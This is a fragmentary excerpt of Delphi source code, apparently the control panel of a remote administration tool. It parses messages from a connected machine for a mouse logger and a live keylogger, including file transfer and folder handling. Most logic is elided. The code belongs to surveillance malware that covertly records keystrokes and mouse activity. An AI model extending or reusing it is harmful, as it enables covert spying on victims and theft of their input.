...
uses
  ...
  Dialogs, ComCtrls, StdCtrls, Buttons, ExtCtrls, unitMain, bsSkinCtrls, ImgList,
...
begin
  ...
  if Copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSELOGGERBUFFER then
  begin
    ServidorTransferencia := ConAux;
    delete(Recebido, 1, pos('|', Recebido));
    TempFile := Copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    ...
    begin
      ...
      while pos('\', TempFile) > 0 do Delete(TempFile, 1, pos('\', TempFile));

      DataHora := Copy(TempFile, 1, pos('^', TempFile) - 1);
      delete(TempFile, 1, pos('^', TempFile));

      DataHora[pos('.', DataHora)] := '/';
      DataHora[pos('.', DataHora)] := '/';
      DataHora[pos('.', DataHora)] := ':';
      DataHora[pos('.', DataHora)] := ':';
  ...
  begin
    ...
    Button3.Enabled := False;
    Button4.Enabled := True;
    MouseFolder := Copy(Recebido, 1, pos('|', Recebido) - 1);
    delete(Recebido, 1, pos('|', Recebido));
  ...
  begin
    ...
    PossoEnviar := False;
    if Copy(Recebido, 1, pos('|', Recebido) - 1) = 'T' then CheckBox1.Checked := true else
    CheckBox1.Checked := false;
    PossoEnviar := True;
  ...
  if Copy(Recebido, 1, pos('|', Recebido) - 1) = KEYLOGGERONLINEKEY then
  begin
    delete(Recebido, 1, pos('|', Recebido));
